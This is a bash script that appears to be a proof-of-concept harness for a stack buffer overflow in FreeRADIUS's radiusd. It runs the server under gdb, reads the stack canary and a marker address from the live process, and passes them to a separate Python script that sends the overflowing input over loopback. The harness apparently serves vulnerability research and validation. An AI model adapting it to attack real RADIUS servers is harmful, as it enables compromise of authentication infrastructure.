#!/bin/bash
# Loopback-only: read canary + benign marker address from the same live radiusd
# under gdb, then drive the overflow from wire input with those values.
set -u
cd "$(dirname "$0")"
export LD_LIBRARY_PATH="$PWD/talloc-prefix/usr/lib/x86_64-linux-gnu${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
gcc -shared -fPIC -O2 -o r4l-marker.so r4l-marker.c || exit 1
export LD_PRELOAD="$PWD/r4l-marker.so"
rm -f r4l-marker-gdb.log r4l-marker-peer.out
gdb -q -batch -x r4l-marker.cmd ./install/sbin/radiusd > r4l-marker-gdb.log 2>&1 &
GDBPID=$!
for i in $(seq 1 200); do
  grep -q 'R4L-MARKER ' r4l-marker-gdb.log && break
  sleep 0.1
done
CANARY_LINE=$(grep -m1 'R4L-CANARY ' r4l-marker-gdb.log || true)
MARKER_LINE=$(grep -m1 'R4L-MARKER ' r4l-marker-gdb.log || true)
CANARY=${CANARY_LINE#*R4L-CANARY }
MARKER=${MARKER_LINE#*R4L-MARKER }
echo "read from process: canary=$CANARY marker=$MARKER"
if [ -z "$CANARY" ] || [ -z "$MARKER" ]; then
  echo "NO CANARY/MARKER - gdb log:"
  cat r4l-marker-gdb.log
  kill "$GDBPID" 2>/dev/null || true
  exit 1
fi
for i in $(seq 1 200); do
  grep -q 'Ready to process requests' r4l-marker-gdb.log && break
  sleep 0.1
done
R4L_CANARY="$CANARY" R4L_MARKER="$MARKER" \
  python3 peer-marker.py key-known --outdir logs/r4l-marker > r4l-marker-peer.out 2>&1
for i in $(seq 1 100); do
  kill -0 "$GDBPID" 2>/dev/null || break
  sleep 0.1
done
kill "$GDBPID" 2>/dev/null || true
wait "$GDBPID" 2>/dev/null || true
echo "--- peer ---"
cat r4l-marker-peer.out
echo "--- gdb tail ---"
grep -n 'R4L-CANARY\|R4L-MARKER\|exit\|signal\|inferior' r4l-marker-gdb.log | tail -20
